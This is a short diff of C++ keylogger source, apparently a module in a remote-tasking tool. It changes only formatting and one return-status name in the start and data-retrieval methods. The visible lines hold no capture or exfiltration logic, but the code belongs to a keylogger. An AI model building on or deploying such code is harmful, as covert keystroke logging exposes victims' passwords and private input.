@@ -41,8 +41,7 @@ KeyloggerResult Keylogger::keylog_start()
     {
         return {
             TASK_ERROR,
-            TaskError{1, "Keylogger is already running."}
-        };
+            TaskError{1, "Keylogger is already running."}};
     }
 
     {
@@ -57,9 +56,8 @@ KeyloggerResult Keylogger::keylog_start()
     logging_enabled = true;
     hook_thread = std::thread(&Keylogger::hook_loop, this);
     return {
-        RUNNING,    
-        TaskSuccess{"Keylogger started successfully."}
-    };
+        RUNNING,
+        TaskSuccess{"Keylogger started successfully."}};
 }
 
 void Keylogger::hook_loop()
@@ -212,9 +210,8 @@ KeyloggerResult Keylogger::get_keylog_data()
         last_window = NULL;
     }
     return {
-        SUCCESS,
-        TaskSuccess{result}
-    };
+        COMPLETED,
+        TaskSuccess{result}};
 }
 
 std::string Keylogger::escape_json(const std::string &value)
